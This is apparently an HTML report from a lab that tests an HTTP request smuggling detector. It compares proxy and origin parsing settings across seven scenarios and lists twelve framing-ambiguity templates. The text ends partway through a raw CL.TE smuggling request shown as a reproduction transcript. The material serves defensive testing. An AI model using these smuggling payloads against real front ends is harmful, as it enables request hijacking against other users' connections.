@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTTP Request Smuggling Lab report</title>
+<style>
+:root{
+  --bg:#f7f8fa; --fg:#1a1d23; --muted:#5b6472; --card:#ffffff; --line:#dde1e7;
+  --accent:#2f6fed; --bad:#c0392b; --bad-bg:#fdecea; --ok:#1e7d3f; --ok-bg:#e8f6ec;
+  --code-bg:#eef1f5; --code-fg:#1a1d23;
+}
+@media (prefers-color-scheme: dark){
+  :root{
+    --bg:#0f1216; --fg:#e7ebf0; --muted:#9aa4b2; --card:#171c22; --line:#2a323c;
+    --accent:#6ea0ff; --bad:#ff7a6e; --bad-bg:#2a1a18; --ok:#5fd08a; --ok-bg:#12281a;
+    --code-bg:#0b0e12; --code-fg:#d8dee6;
+  }
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);overflow-x:hidden;
+  font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+.wrap{max-width:1080px;margin:0 auto;padding:28px 16px 80px}
+h1{font-size:26px;margin:0 0 4px}
+h2{font-size:20px;margin:34px 0 12px}
+h3{font-size:17px;margin:0 0 6px}
+h4{font-size:14px;margin:20px 0 8px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+h5{font-size:13px;margin:14px 0 4px;color:var(--muted)}
+.sub{color:var(--muted);margin:0 0 18px}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin:18px 0}
+.stat{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+.stat .n{font-size:26px;font-weight:650;line-height:1.1}
+.stat .l{color:var(--muted);font-size:12.5px;margin-top:4px}
+.stat.good .n{color:var(--ok)} .stat.bad .n{color:var(--bad)}
+.card{background:var(--card);border:1px solid var(--line);border-radius:12px;
+  padding:20px 22px;margin:18px 0}
+.card-head{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;flex-wrap:wrap}
+.story{color:var(--muted);margin:6px 0 16px}
+.badge{font-size:12px;padding:3px 9px;border-radius:999px;font-weight:600;white-space:nowrap}
+.badge.ok{background:var(--ok-bg);color:var(--ok)}
+.badge.bad{background:var(--bad-bg);color:var(--bad)}
+.pipeline{display:flex;align-items:stretch;gap:10px;margin:14px 0;flex-wrap:wrap}
+.pipeline .arrow{align-self:center;color:var(--muted);font-size:22px}
+.hop{flex:1 1 260px;min-width:0;position:relative}
+.hop-label{font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);
+  margin:6px 0 0 2px}
+.dialect{border:1px solid var(--line);border-radius:10px;padding:12px 14px;height:100%}
+.dialect-name{font-weight:650}
+.dialect p{color:var(--muted);font-size:13px;margin:4px 0 10px}
+table.kv{width:100%;border-collapse:collapse;font-size:12px}
+table.kv td{border-top:1px solid var(--line);padding:3px 4px;vertical-align:top}
+table.kv td:first-child{white-space:nowrap;color:var(--muted)}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:8px 0}
+table.grid{border-collapse:collapse;font-size:13px;min-width:560px;width:100%}
+table.grid td,table.grid th{overflow-wrap:anywhere}
+table.grid th,table.grid td{border:1px solid var(--line);padding:6px 8px;text-align:left;
+  vertical-align:top}
+table.grid th{background:var(--code-bg);font-size:12px;color:var(--muted)}
+table.grid tr.vuln td{background:var(--bad-bg)}
+table.grid tr.clean td{color:var(--muted)}
+code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  background:var(--code-bg);color:var(--code-fg);padding:1px 5px;border-radius:4px;font-size:.9em}
+pre{background:var(--code-bg);color:var(--code-fg);border:1px solid var(--line);border-radius:8px;
+  padding:12px 14px;overflow:auto;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  font-size:12.5px;line-height:1.45}
+.shape-row{display:flex;justify-content:space-between;gap:10px;padding:7px 10px;border-radius:8px;
+  margin:6px 0;flex-wrap:wrap}
+.shape-row.vuln{background:var(--bad-bg)}
+.shape-row.clean{background:var(--code-bg);color:var(--muted)}
+.shape-name{font-weight:650}
+.shape-verdict{font-size:13px}
+.why{color:var(--muted);font-size:13px;margin:2px 0 8px}
+.evidence{margin:8px 0}
+.ev-label{font-size:12px;color:var(--muted);margin-bottom:3px}
+.note{color:var(--muted);font-size:13px;margin:2px 0 10px}
+.score-ok{color:var(--ok);font-size:13px;font-weight:600}
+.score-bad{color:var(--bad);font-size:13px;font-weight:600}
+.err{color:var(--bad)}
+.muted{color:var(--muted)}
+details.sample,details.instr{margin:10px 0;border:1px solid var(--line);border-radius:9px;
+  padding:8px 12px}
+details > summary{cursor:pointer;font-weight:600}
+.pipeline-strip{display:flex;flex-wrap:wrap;gap:8px;margin:8px 0 4px}
+.pill{font-size:12.5px;padding:4px 11px;border-radius:999px;text-decoration:none;
+  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+.pill.ok{background:var(--ok-bg);color:var(--ok)}
+.pill.bad{background:var(--bad-bg);color:var(--bad)}
+.appendix h4{margin-top:22px}
+.footer{color:var(--muted);font-size:12.5px;margin-top:34px;border-top:1px solid var(--line);
+  padding-top:14px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>HTTP Request Smuggling Lab — detection report</h1>
+  <p class="sub">Front end and back end parse the same bytes; the detector looks for
+  a request boundary the two hops disagree on. Generated 2026-11-22 18:00 UTC ·
+  7 scenarios · 3 trials per shape.</p>
+
+  <div class="stats">
+    <div class="stat good"><div class="n">5</div>
+      <div class="l">black-box findings confirmed<br>(5 expected)</div></div>
+    <div class="stat good">
+      <div class="n">0</div><div class="l">black-box false positives</div></div>
+    <div class="stat good">
+      <div class="n">0</div><div class="l">black-box false negatives</div></div>
+    <div class="stat good">
+      <div class="n">7</div>
+      <div class="l">instrumented template desyncs<br>(7 expected)</div></div>
+    <div class="stat good">
+      <div class="n">0</div>
+      <div class="l">instrumented FP + FN</div></div>
+  </div>
+
+  <div class="pipeline-strip"><a href="#matched-strict" class="pill ok">matched-strict</a><a href="#matched-modern" class="pill ok">matched-modern</a><a href="#matched-lenient" class="pill ok">matched-lenient</a><a href="#cl-te-desync" class="pill bad">cl-te-desync</a><a href="#te-cl-desync" class="pill bad">te-cl-desync</a><a href="#cl-cl-desync" class="pill bad">cl-cl-desync</a><a href="#te-te-desync" class="pill bad">te-te-desync</a></div>
+
+  <h2>Scenarios</h2>
+  <div id="matched-strict">
+    <section class="card">
+      <header class="card-head">
+        <h3>Strict proxy in front of a strict origin</h3>
+        <span class="badge ok">consistent (no desync)</span>
+      </header>
+      <p class="story">An nginx-style proxy and a Python-style origin both reject TE+CL and normalise framing. They agree on every boundary, so nothing desyncs -- the detector must stay silent.</p>
+      <div class="pipeline">
+        <div class="hop"><div class="dialect"><div class="dialect-name">nginx</div><p>Strict-ish reverse proxy: rejects bare LF in the head, normalises obs-fold, takes the last Content-Length, prefers TE over CL and rewrites the head when forwarding.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>True</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>chunked_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>last</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>True</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">front end</div></div>
+        <div class="arrow">→</div>
+        <div class="hop"><div class="dialect"><div class="dialect-name">python-origin</div><p>Back end built on the firewall&#x27;s own parser: strict RFC framing, rejects TE+CL, last duplicate CL wins.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>False</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>reject</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>last</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">back end</div></div>
+      </div>
+      <p class="score-ok">matches ground truth exactly (no FP, no FN)</p>
+      <h4>Black-box response-queue oracle</h4>
+      <p class="note">A shape is confirmed only when a hidden request executes on a
+      <em>different</em> client connection than the attacker's, after the attacker's
+      connection has closed. A negative control checks the range itself.</p>
+      <div class="shape-row clean"><span class="shape-name">CL.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">TE.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">CL.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">TE.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div>
+      <details class="instr">
+        <summary>Instrumented framing differential (all 12 templates)</summary>
+        <p class="note">Measured from the lab's own per-hop framing record. This can see
+        every ambiguity family, including ones a remote target could not confirm without
+        timing noise. It validates the range and the templates, not a remote target.</p>
+        <div class="tablewrap"><table class="grid"><thead><tr><th>template</th><th>family</th><th>ambiguity</th><th>framing differential</th></tr></thead><tbody><tr class="clean"><td><code>cl_te</code></td><td>CL.TE</td><td>Content-Length + Transfer-Encoding (front trusts CL)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_cl</code></td><td>TE.CL</td><td>Transfer-Encoding + Content-Length (front trusts TE)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_unknown</code></td><td>TE.TE</td><td>Duplicate Transfer-Encoding, unknown coding after chunked</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_space</code></td><td>TE.TE</td><td>Transfer-Encoding value with trailing whitespace</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_identity</code></td><td>TE.TE</td><td>chunked followed by identity</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_name_ws</code></td><td>TE.TE</td><td>Whitespace before the colon on a second TE header</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_dup_chunked</code></td><td>TE.TE</td><td>Transfer-Encoding: chunked sent twice</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl</code></td><td>CL.CL</td><td>Duplicate Content-Length, large first / small second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl_reverse</code></td><td>CL.CL</td><td>Duplicate Content-Length, small first / large second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>bare_lf</code></td><td>LF</td><td>Bare-LF line terminators in the head</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_size_ws</code></td><td>CHUNK</td><td>Leading whitespace before the chunk size</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_ext</code></td><td>CHUNK</td><td>Chunk extension on the chunk-size line</td><td>both hops framed the same boundaries</td></tr></tbody></table></div>
+      </details>
+    </section>
+    </div><div id="matched-modern">
+    <section class="card">
+      <header class="card-head">
+        <h3>Modern proxy in front of a Go-style origin</h3>
+        <span class="badge ok">consistent (no desync)</span>
+      </header>
+      <p class="story">An envoy-style proxy and a Go-style origin both refuse ambiguous framing. A hardened baseline pair.</p>
+      <div class="pipeline">
+        <div class="hop"><div class="dialect"><div class="dialect-name">envoy</div><p>Modern L7 proxy: rejects bare LF, rejects TE+CL, re-frames bodies with Content-Length when it can.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>False</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>reject</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>reject</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">front end</div></div>
+        <div class="arrow">→</div>
+        <div class="hop"><div class="dialect"><div class="dialect-name">go-origin</div><p>Go net/http style origin: rejects TE+CL, allows chunk extensions, strict on duplicate Content-Length.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>False</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>reject</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>reject</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">back end</div></div>
+      </div>
+      <p class="score-ok">matches ground truth exactly (no FP, no FN)</p>
+      <h4>Black-box response-queue oracle</h4>
+      <p class="note">A shape is confirmed only when a hidden request executes on a
+      <em>different</em> client connection than the attacker's, after the attacker's
+      connection has closed. A negative control checks the range itself.</p>
+      <div class="shape-row clean"><span class="shape-name">CL.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">TE.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">CL.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">TE.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div>
+      <details class="instr">
+        <summary>Instrumented framing differential (all 12 templates)</summary>
+        <p class="note">Measured from the lab's own per-hop framing record. This can see
+        every ambiguity family, including ones a remote target could not confirm without
+        timing noise. It validates the range and the templates, not a remote target.</p>
+        <div class="tablewrap"><table class="grid"><thead><tr><th>template</th><th>family</th><th>ambiguity</th><th>framing differential</th></tr></thead><tbody><tr class="clean"><td><code>cl_te</code></td><td>CL.TE</td><td>Content-Length + Transfer-Encoding (front trusts CL)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_cl</code></td><td>TE.CL</td><td>Transfer-Encoding + Content-Length (front trusts TE)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_unknown</code></td><td>TE.TE</td><td>Duplicate Transfer-Encoding, unknown coding after chunked</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_space</code></td><td>TE.TE</td><td>Transfer-Encoding value with trailing whitespace</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_identity</code></td><td>TE.TE</td><td>chunked followed by identity</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_name_ws</code></td><td>TE.TE</td><td>Whitespace before the colon on a second TE header</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_dup_chunked</code></td><td>TE.TE</td><td>Transfer-Encoding: chunked sent twice</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl</code></td><td>CL.CL</td><td>Duplicate Content-Length, large first / small second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl_reverse</code></td><td>CL.CL</td><td>Duplicate Content-Length, small first / large second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>bare_lf</code></td><td>LF</td><td>Bare-LF line terminators in the head</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_size_ws</code></td><td>CHUNK</td><td>Leading whitespace before the chunk size</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_ext</code></td><td>CHUNK</td><td>Chunk extension on the chunk-size line</td><td>both hops framed the same boundaries</td></tr></tbody></table></div>
+      </details>
+    </section>
+    </div><div id="matched-lenient">
+    <section class="card">
+      <header class="card-head">
+        <h3>Two lenient hops that happen to agree</h3>
+        <span class="badge ok">consistent (no desync)</span>
+      </header>
+      <p class="story">A legacy appliance and an ancient origin are both loose, but loose in the *same* way: same bare-LF rule, same first-CL rule, same chunk handling. Being sloppy is not the bug; disagreeing is.</p>
+      <div class="pipeline">
+        <div class="hop"><div class="dialect"><div class="dialect-name">loose-proxy</div><p>Legacy appliance: accepts bare LF, whitespace before &#x27;:&#x27;, first-wins duplicate CL, and forwards bytes verbatim.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>True</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>False</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>True</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>True</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>False</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>chunked_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>first</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>True</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>True</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">front end</div></div>
+        <div class="arrow">→</div>
+        <div class="hop"><div class="dialect"><div class="dialect-name">legacy-origin</div><p>Ancient CGI-style origin: accepts bare LF, whitespace before &#x27;:&#x27;, first duplicate CL wins, and tolerates &#x27; 5&#x27; chunk sizes.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>True</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>False</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>True</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>False</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>chunked_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>first</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>True</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>True</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">back end</div></div>
+      </div>
+      <p class="score-ok">matches ground truth exactly (no FP, no FN)</p>
+      <h4>Black-box response-queue oracle</h4>
+      <p class="note">A shape is confirmed only when a hidden request executes on a
+      <em>different</em> client connection than the attacker's, after the attacker's
+      connection has closed. A negative control checks the range itself.</p>
+      <div class="shape-row clean"><span class="shape-name">CL.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">TE.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">CL.CL</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div><div class="shape-row clean"><span class="shape-name">TE.TE</span><span class="shape-verdict">no cross-connection leak (0/3 trials) — not confirmed</span></div>
+      <details class="instr">
+        <summary>Instrumented framing differential (all 12 templates)</summary>
+        <p class="note">Measured from the lab's own per-hop framing record. This can see
+        every ambiguity family, including ones a remote target could not confirm without
+        timing noise. It validates the range and the templates, not a remote target.</p>
+        <div class="tablewrap"><table class="grid"><thead><tr><th>template</th><th>family</th><th>ambiguity</th><th>framing differential</th></tr></thead><tbody><tr class="clean"><td><code>cl_te</code></td><td>CL.TE</td><td>Content-Length + Transfer-Encoding (front trusts CL)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_cl</code></td><td>TE.CL</td><td>Transfer-Encoding + Content-Length (front trusts TE)</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_unknown</code></td><td>TE.TE</td><td>Duplicate Transfer-Encoding, unknown coding after chunked</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_space</code></td><td>TE.TE</td><td>Transfer-Encoding value with trailing whitespace</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_identity</code></td><td>TE.TE</td><td>chunked followed by identity</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_name_ws</code></td><td>TE.TE</td><td>Whitespace before the colon on a second TE header</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>te_te_dup_chunked</code></td><td>TE.TE</td><td>Transfer-Encoding: chunked sent twice</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl</code></td><td>CL.CL</td><td>Duplicate Content-Length, large first / small second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>cl_cl_reverse</code></td><td>CL.CL</td><td>Duplicate Content-Length, small first / large second</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>bare_lf</code></td><td>LF</td><td>Bare-LF line terminators in the head</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_size_ws</code></td><td>CHUNK</td><td>Leading whitespace before the chunk size</td><td>both hops framed the same boundaries</td></tr><tr class="clean"><td><code>chunk_ext</code></td><td>CHUNK</td><td>Chunk extension on the chunk-size line</td><td>both hops framed the same boundaries</td></tr></tbody></table></div>
+      </details>
+    </section>
+    </div><div id="cl-te-desync">
+    <section class="card">
+      <header class="card-head">
+        <h3>Load balancer trusts Content-Length, origin trusts chunked</h3>
+        <span class="badge bad">2 wire shape(s), 3 template(s) desync</span>
+      </header>
+      <p class="story">A load balancer that prefers Content-Length fronts a Java-style origin that prefers Transfer-Encoding. A chunked-looking tail is body to the balancer and a new request to the origin: classic CL.TE.</p>
+      <div class="pipeline">
+        <div class="hop"><div class="dialect"><div class="dialect-name">legacy-lb</div><p>Load balancer that obeys Content-Length when both framing headers are present, keeps the first duplicate CL, and forwards verbatim.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>True</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>cl_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>first</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">front end</div></div>
+        <div class="arrow">→</div>
+        <div class="hop"><div class="dialect"><div class="dialect-name">java-origin</div><p>Servlet-container style origin: lenient request-line whitespace, last CL wins, accepts obs-fold and chunk extensions.</p><table class="kv"><tr><td><code>accept_bare_lf</code></td><td><code>False</code></td></tr><tr><td><code>reject_bare_cr</code></td><td><code>True</code></td></tr><tr><td><code>allow_ws_before_colon</code></td><td><code>False</code></td></tr><tr><td><code>allow_obs_fold</code></td><td><code>True</code></td></tr><tr><td><code>te_tokens_casefold</code></td><td><code>True</code></td></tr><tr><td><code>te_allow_ws_in_list</code></td><td><code>True</code></td></tr><tr><td><code>te_requires_chunked_last</code></td><td><code>True</code></td></tr><tr><td><code>te_unknown_policy</code></td><td><code>reject</code></td></tr><tr><td><code>te_with_cl</code></td><td><code>chunked_wins</code></td></tr><tr><td><code>te_first_header_only</code></td><td><code>False</code></td></tr><tr><td><code>te_unusable_falls_back_to_cl</code></td><td><code>False</code></td></tr><tr><td><code>cl_duplicate_policy</code></td><td><code>last</code></td></tr><tr><td><code>cl_allow_sign</code></td><td><code>False</code></td></tr><tr><td><code>cl_allow_ows</code></td><td><code>True</code></td></tr><tr><td><code>cl_allow_comma</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_ws</code></td><td><code>False</code></td></tr><tr><td><code>chunk_allow_0x</code></td><td><code>False</code></td></tr><tr><td><code>chunk_ext_policy</code></td><td><code>strip</code></td></tr></table></div><div class="hop-label">back end</div></div>
+      </div>
+      <p class="score-ok">matches ground truth exactly (no FP, no FN)</p>
+      <h4>Black-box response-queue oracle</h4>
+      <p class="note">A shape is confirmed only when a hidden request executes on a
+      <em>different</em> client connection than the attacker's, after the attacker's
+      connection has closed. A negative control checks the range itself.</p>
+      <div class="shape-row vuln"><span class="shape-name">CL.TE</span><span class="shape-verdict">confirmed — leaked in 3/3 trials (confidence 100%)</span></div><p class='why'>The front end reads the whole blob as a Content-Length body; the origin decodes it as chunked, ends the body at the zero chunk, and treats the remaining bytes as the start of the next request.</p><div class="evidence"><div class="ev-label">trigger response on the fresh connection (leaks the hidden marker):</div><pre>ECHO h268af43f0af3</pre></div><details class="sample"><summary>Reproduce: <code>cl_te</code></summary><p>The front end reads the whole blob as a Content-Length body; the origin decodes it as chunked, ends the body at the zero chunk, and treats the remaining bytes as the start of the next request.</p><h5>Wire transcript (\r\n shown literally)</h5><pre>POST /__lab/noop HTTP/1.1\r\n
+Host: attacker\r\n
+Content-Length: 84\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+GET /__lab/echo/SMUGGLE_MARKER HTTP/1.1\r\n
+Host: smuggled\r\n
